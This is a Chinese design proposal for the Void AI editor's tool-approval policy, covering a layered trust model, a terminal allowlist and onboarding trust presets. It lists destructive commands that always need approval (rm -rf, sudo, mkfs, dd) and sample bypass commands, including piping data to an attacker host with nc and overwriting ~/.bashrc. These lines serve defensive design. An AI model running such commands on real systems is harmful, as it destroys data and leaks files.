# 改进：工具审批策略分层信任模型（improve-tool-approval-policy）

## 背景

当前 Void 默认 `defaultGlobalSettings.autoApprove = {}`（`src/vs/workbench/contrib/void/common/voidSettingsTypes.ts:506`），三类审批键（`edits` / `terminal` / `MCP tools`）全部未勾选。

这带来两个用户痛点：

1. **默认无法改代码/新建文件**：在 `agent` 模式下，只要 LLM 调用 `edit_file` / `create_file_or_folder` / `rewrite_file` / `delete_file_or_folder`，`_runToolCall` 就会写入 `tool_request` 消息并中断主循环，等用户点击 Accept。长对话中用户需要反复点击，体验远不如 Windsurf / Cursor / Claude Code 的"信任一次即全程自动"。
2. **审批粒度太粗**：只有三档开关（`edits` / `terminal` / `MCP tools`），用户无法表达"仓库内编辑可自动、写仓库外需审批"或"只允许安全命令自动运行（npm/git status/ls），危险命令仍需审批（rm/curl/sudo）"。

对标业界：
- **Windsurf Cascade**：只读工具默认自动运行；修改类工具有明显的 diff 预览 + 一键信任；终端 allowlist 精细化。
- **Claude Code**：`Plan Mode` 强制只读；`--dangerously-skip-permissions` 可显式解除审批；`PreToolUse` hook 可自定义策略。

## 目标

- 引入**分层信任模型**（reads / edits-in-workspace / edits-outside / terminal-allowlist / mcp-per-server），默认值能让大多数用户"开箱即用"地完成 agent 编辑流程，同时保留对敏感操作的审批边界。
- 在 Onboarding 新增一步**信任级别**选择（保守 / 标准 / 无缝），一键预设 `autoApprove` 组合，并允许后续在设置页调整。
- 在 Chat 的 tool_request 卡片上新增"**接受并信任此类操作**（本会话 / 永久）"按钮，降低反复点击的摩擦。
- 保持对 `dangerous` 操作（仓库外写入、破坏性终端命令、未受信 MCP server）的**强制审批**，并可通过设置覆盖。

## 非目标

- **不**改变 `ChatMode` 枚举（`'agent' | 'gather' | 'normal'`）本身，仅调整每种模式下工具审批默认值。
- **不**引入"每工具手动审批模式"的 UI（当前 autoApprove 按"类"粒度，不拆到单工具）；审批粒度本次只拆到"类 + 范围"两个维度。
- **不**实现完整的 `PreToolUse` / `PostToolUse` 钩子机制（留给后续 `add-tool-hooks` change）。
- **不**引入 Plan Mode（由独立 change `add-plan-mode` 处理）。
- **不**改动已有 builtin 工具清单、工具实现，仅改审批判定链路与设置结构。
- **不**翻译或改动 i18n 文案之外的 UI 布局（本次只在设置页与 tool_request 卡片内增加控件）。

## 方案要点

### 1. 扩展 `autoApprove` 设置结构（语义细化）

当前：
```ts
autoApprove: { [approvalType in ToolApprovalType]?: boolean }
// ToolApprovalType = 'edits' | 'terminal' | 'MCP tools'
```

扩展为：
```ts
autoApprove: {
  reads?: boolean;             // 预留（当前只读工具本就无审批，显式化用于 UI 呈现）
  editsInWorkspace?: boolean;  // 仓库内编辑（edit_file / rewrite_file / create_file_or_folder / delete_file_or_folder）
  editsOutsideWorkspace?: boolean; // 仓库外路径编辑
  terminalAllowlist?: boolean; // 是否启用 allowlist（true 时对 allowlist 内命令免批）
  terminalAllowlistPatterns?: string[]; // 默认若干安全命令（npm、git status、ls、cat、pwd、echo）
  terminalAny?: boolean;       // 所有终端命令免批（激进）
  mcpPerServer?: { [serverName: string]: boolean };
  mcpAll?: boolean;
}
```

旧字段保留**只读兼容**：读取时 `edits` 映射为 `editsInWorkspace + editsOutsideWorkspace` 的合取；`terminal` 映射为 `terminalAny`；`'MCP tools'` 映射为 `mcpAll`。

### 2. 审批判定链路调整

`chatThreadService.ts:642-652` 当前判定：

```ts
const approvalType = isBuiltInTool ? approvalTypeOfBuiltinToolName[toolName] : 'MCP tools'
if (approvalType) {
  const autoApprove = this._settingsService.state.globalSettings.autoApprove[approvalType]
  if (!autoApprove) return { awaitingUserApproval: true }
}
```

改为：`resolveAutoApprove(toolName, params, autoApprove, workspaceFolders)` 函数，按"类 + 范围"双维度查询：
- 若 `edit_file` 且 `params.uri` 在 workspace 内 → 看 `editsInWorkspace`；否则看 `editsOutsideWorkspace`。
- 若 `run_command` 且 `command` 匹配 `terminalAllowlistPatterns` → 看 `terminalAllowlist`；否则看 `terminalAny`。
- 若 MCP → 先看 `mcpPerServer[serverName]`，缺失时回退 `mcpAll`。

### 3. Onboarding 信任级别

在现有 Onboarding 第 2 页（设置与主题）后新增一小节"AI 信任级别"（或嵌入同页底部），三单选：

| 级别 | `autoApprove` 预设 |
|---|---|
| **保守** | 全部 `false`（等同当前默认） |
| **标准**（推荐） | `editsInWorkspace: true`；`terminalAllowlist: true`（含 npm/git status/ls/cat/pwd/echo/node --version/python --version）；其余 `false` |
| **无缝** | `editsInWorkspace: true`、`editsOutsideWorkspace: false`、`terminalAny: true`、`mcpAll: true` |

首启默认 = **标准**，用户可在设置页 `General` 分区随时改。

### 4. tool_request 卡片增强

`SidebarChat.tsx` 中已存在 tool_request 卡片（Accept / Reject 两按钮）。新增：
- **"接受并本会话信任此类"** 按钮 → 将对应 `autoApprove.*` 写入内存态（不持久化），当前 thread 内后续同类请求自动通过。
- **"接受并永久信任此类"** 按钮 → 写入 `globalSettings.autoApprove.*` 并持久化。
- 两按钮旁显示当前范围提示（workspace / outside / allowlisted 等）。

### 5. 终端 allowlist 默认模式

`terminalAllowlistPatterns` 默认：
```
['npm ', 'npx ', 'pnpm ', 'yarn ', 'git status', 'git log', 'git diff', 'git branch',
 'ls', 'dir', 'pwd', 'cat ', 'type ', 'echo ', 'node --version', 'python --version', 'py --version',
 'tsc --version', 'which ', 'where ']
```

匹配策略：命令首段前缀匹配（空格或行尾分隔），大小写敏感按 OS 规则。用户可在设置中增删。

### 6. 危险操作"硬审批"

即使用户选择"无缝"或开启 `terminalAny`，以下仍**强制审批**（不在本 change 实现全部，留预留字段 `mustAlwaysApprovePatterns`）：
- 终端匹配 `rm -rf`、`del /s`、`format`、`sudo`、`rmdir /s`、`mkfs`、`dd if=`
- 编辑匹配用户主目录外 + 系统盘根目录（`C:\Windows`、`/etc`、`/usr`）

本 change 先落地允许清单与范围判定，危险 pattern 做预留字段（默认空），完整实现在后续 `add-dangerous-op-guard` change。

## 影响范围

### 新增能力

- `tool-approval-policy`：Void 工具审批策略的分层信任模型；定义审批结构、默认值、Onboarding 预设、tool_request 交互。

### 修改能力

（当前 `openspec/specs/` 为空，无既有能力需要修改。）

### 受影响代码

- `src/vs/workbench/contrib/void/common/voidSettingsTypes.ts`：扩展 `GlobalSettings.autoApprove` 结构；定义 `TrustLevel` 类型与预设映射；保留旧字段只读兼容。
- `src/vs/workbench/contrib/void/common/toolsServiceTypes.ts`：新增 `resolveAutoApprove` helper 签名导出。
- `src/vs/workbench/contrib/void/browser/chatThreadService.ts`（line 642–652）：改用 `resolveAutoApprove` 替代直接查表。
- `src/vs/workbench/contrib/void/browser/react/src/void-onboarding/VoidOnboarding.tsx`：新增"AI 信任级别"三单选区块。
- `src/vs/workbench/contrib/void/browser/react/src/void-settings-tsx/Settings.tsx`：`General` 或 `Tools` 分区新增信任级别与 allowlist 编辑 UI。
- `src/vs/workbench/contrib/void/browser/react/src/sidebar-tsx/SidebarChat.tsx`：tool_request 卡片新增"信任此类（会话/永久）"两按钮。
- `src/vs/workbench/contrib/void/browser/react/src/i18n/types.ts` + `locales/en.ts` + `locales/zh-cn.ts`：新增 `settings.trust.*`、`onboarding.trust.*`、`chat.tool.trust.*` 键位。

### 验证

- 静态：`openspec validate improve-tool-approval-policy` 通过。
- 单测：新增 `resolveAutoApprove` 的单元测试，覆盖 workspace/outside、allowlist 命中/未命中、MCP per-server 回退、旧字段向后兼容。
- 动态：
  - 以干净 `--user-data-dir` 启动 `Void.exe`，Onboarding 默认选中"标准"；完成后到设置页验证预设正确写入。
  - `agent` 模式下让 LLM 编辑仓库内文件 → 不弹审批；编辑仓库外 → 弹审批。
  - 让 LLM 执行 `git status` → 自动通过；执行 `rm -rf xxx` → 即使 `terminalAny=true` 也弹审批（预留实现后生效）。
  - tool_request 卡片 Accept 会话信任后，同类后续请求直接通过，关闭应用再打开恢复需审批（未选永久信任）。
- 回归：旧 `autoApprove` 字段值（`edits: true` 等）被正确映射，升级用户行为不退化。

## 风险与回滚

- **风险 A — 默认"标准"过于激进**：部分用户不期望仓库内文件自动修改。
  - 缓解：Onboarding 强制做出明确选择（不默认跳过），文案说清楚每档行为；旧用户升级时保留原 `autoApprove` 语义不变（迁移期视为"保守"）。
- **风险 B — allowlist 匹配误伤**：前缀匹配可能把 `git diff file-with-sudo-in-name` 这样的边缘命令放行或挡住。
  - 缓解：pattern 末尾以空格区分，匹配命令首段；文档说明。
- **风险 C — 旧字段兼容层复杂**：`edits: true` 映射 `editsInWorkspace=true && editsOutsideWorkspace=true` 可能与用户预期不一致。
  - 缓解：升级弹窗提示一次"我们将迁移你的审批设置到新结构"，并显示预览。
- **回滚**：本次为设置结构**向后兼容扩展**；若回滚只需 revert 新字段读取 + UI，旧字段继续工作不受影响。

---

## Addendum（2026-04-18 追加）

为对齐 Cursor / Windsurf 已被用户验证的默认行为，在初版 P0-1 实现之上追加三项变更：

### A1. 默认档从"强制选择"改为"standard"

- `defaultGlobalSettings.trustLevel = 'standard'`；`defaultGlobalSettings.autoApprove = { editsInWorkspace: true, terminalAllowlist: true, terminalAllowlistPatterns: [...DEFAULT_TERMINAL_ALLOWLIST] }`
- 动机：对齐主流 AI 编辑器的开箱即用体验；仍对"工作区外编辑 / 任意终端命令 / MCP 工具"保持人工审批。
- 影响：Onboarding 的"强制选择信任级别"任务（阶段 C）降级为可选增强；现有用户持久化配置在 `readAndInitializeState` 的 `{ ...defaultState(), ...readS }` 合并下不受影响。

### A2. 扩充 `DEFAULT_TERMINAL_ALLOWLIST` 至 75 条

按十类分组（Git 只读、文件系统只读、代码搜索、语言版本、包管理器查询、测试、静态分析、Docker/K8s inspect、系统信息、PowerShell 只读 cmdlet），对齐 Cursor/Windsurf 的内置安全清单。**严格排除**任何写入、联网下载、权限提升、容器/集群变更类命令。详见 `voidSettingsTypes.ts` 内的分组注释。

### A3. `matchesAllowlist` 增加 shell 元字符护栏

命令包含 `| > >> && || ; $(...) \` &` 任一者 → 直接返回 `false`，不再查 allowlist。拦截如 `echo pwned > ~/.bashrc`、`cat x | nc attacker`、`git status && rm -rf .` 等通过"首段是安全命令"的绕过。

### Addendum 测试

新增 22 条单元测试（9 条 shell-metachar 边界 + 13 条默认白名单正反例），合计 autoApprove 测试套件 30 + reasoningAuto 22 + meta 1 = **65 passing (31 ms)**。
